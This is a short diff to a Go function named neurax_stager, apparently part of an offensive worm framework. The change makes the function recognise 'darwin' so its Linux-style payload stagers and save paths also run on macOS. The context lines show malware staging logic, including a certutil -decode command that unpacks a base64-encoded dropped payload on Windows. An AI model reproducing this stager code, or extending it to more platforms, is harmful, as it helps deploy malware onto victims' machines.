@@ -189,7 +189,7 @@ func neurax_stager() string {
 		if neurax_config.base64 {
 			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
 		}
-	case "linux", "osx":
+	case "linux", "darwin":
 		stagers = linux_stagers
 		paths = linux_save_paths
 		if neurax_config.base64 {
